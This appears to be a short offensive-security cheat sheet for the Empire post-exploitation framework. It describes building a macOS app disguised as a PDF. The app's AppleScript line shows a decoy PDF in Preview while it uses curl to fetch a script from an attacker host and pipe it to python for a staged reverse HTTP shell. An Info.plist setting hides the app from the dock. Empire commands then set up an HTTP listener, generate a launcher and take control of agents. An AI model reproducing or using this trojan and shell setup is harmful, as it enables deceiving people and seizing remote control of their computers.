# Empire

## Fake macos pdf to staged reverse http shell 

[https://cloudconvert.com/png-to-icns](https://cloudconvert.com/png-to-icns) -> get a 256 byte square png and make it a icns
```
do shell script "s=<IP>:<PORT>; curl -s $s/real.pdf | open -f -a Preview.app & curl -s $s/script | python -"
```

Add this to to Info.plist just above CFBundleAllowMixedLocalizations, the app will no longer spawn two icons in the dock
```
<key>NSUIElement</key>
<string>1</string>
```

## Empire
```bash
rm -rf /opt/Empire/downloads/*

empire

listeners
uselistener http
info
set Name ${listener_name}
set Port ${listener_port}
set Host ${listener_ip}
execute

back
list
launcher python ${listener_name}

main 
agents
list
rename ${old_name} ${new_name}
interact ${new_name} 
shell 
```
